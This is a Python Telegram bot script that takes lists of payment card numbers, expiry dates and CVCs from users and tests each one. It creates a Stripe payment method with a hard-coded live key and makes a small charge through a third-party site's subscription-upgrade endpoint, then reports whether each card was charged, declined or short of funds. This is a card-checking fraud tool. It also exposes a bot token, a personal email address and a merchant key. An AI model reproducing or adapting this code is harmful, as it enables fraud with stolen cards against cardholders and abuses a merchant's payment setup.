import telebot
import requests

# Your Telegram bot token
BOT_TOKEN = '8072279299:AAH0SaBdoqFOIP-qukCCfvCD7LkqefKlu9Q'
bot = telebot.TeleBot(BOT_TOKEN)

# Function to create a Payment Method
def create_payment_method(email, card_number, card_cvc, exp_month, exp_year, postal_code):
    payment_method_url = "https://api.stripe.com/v1/payment_methods"
    
    payload = {
        "type": "card",
        "billing_details[email]": email,
        "billing_details[address][postal_code]": postal_code,
        "card[number]": card_number,
        "card[cvc]": card_cvc,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "key": "pk_live_51IekcQKHPFAlBzyyGNBguT5BEI7NEBqrTxJhsYN1FI1lQb9iWxU5U2OXfi744NEMx5p7EDXh08YXrudrZkkG9bGc00ZCrkXrxL"  # Replace with your actual public key
    }
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }

    response = requests.post(payment_method_url, data=payload, headers=headers)
    
    if response.status_code == 200:
        return response.json()["id"]
    else:
        return None

# Function to upgrade the subscription
def upgrade_subscription(email, payment_method_id):
    upgrade_url = "https://onedtech.philhillaa.com/upgrade?_data=routes%2Fupgrade"
    
    payload = {
        "email": email,
        "force_three_d_secure": "false",
        "price_id": "667c8b20-9c72-4dc4-ad7b-988e543540db",
        "premium_offer_id": "136d8db6-f95f-42c5-bc6c-8fa6f824ef5b",
        "payment_method": payment_method_id,
        "amount_cents": 100
    }
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Accept": "*/*"
    }
    
    response = requests.post(upgrade_url, data=payload, headers=headers)

    if response.status_code == 200:
        response_data = response.json()
        # Check for success or specific error messages
        if "success" in response_data.get('upgrade_success_message', '').lower():
            return "Your card has been successfully charged."
        elif "declined" in response_data.get('upgrade_error_message', '').lower():
            return "Your card was declined."
        elif "insufficient funds" in response_data.get('upgrade_error_message', '').lower():
            return "Insufficient funds on your card."
        else:
            return "An unknown error occurred."
    else:
        return "Failed to upgrade the subscription."

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, "Welcome! Please send your card details in the following format, each on a new line:\n"
                          "`card_number|exp_month|exp_year|card_cvc` (e.g., `4147098797621083|10|2028|202`).")

@bot.message_handler(func=lambda message: True)
def get_card_details(message):
    try:
        # Split the message text by newlines to handle multiple card details
        card_sets = message.text.splitlines()
        email = "peshangsalam2001@gmail.com"  # Use specified email
        postal_code = "10080"  # Use specified postal code
        
        responses = []

        for card_set in card_sets:
            card_details = card_set.strip().split('|')
            if len(card_details) != 4:
                responses.append("Invalid format for card details: " + card_set.strip())
                continue

            card_number = card_details[0].strip()
            exp_month = card_details[1].strip()
            exp_year = card_details[2].strip()
            card_cvc = card_details[3].strip()

            # Create Payment Method
            payment_method_id = create_payment_method(email, card_number, card_cvc, exp_month, exp_year, postal_code)

            if payment_method_id:
                # Upgrade Subscription using the payment method ID
                upgrade_response_message = upgrade_subscription(email, payment_method_id)
                responses.append(upgrade_response_message)
            else:
                responses.append("Failed to create payment method for: " + card_set.strip())

        # Send all responses back to the user
        bot.reply_to(message, "\n".join(responses))

    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")

# Start polling
bot.polling()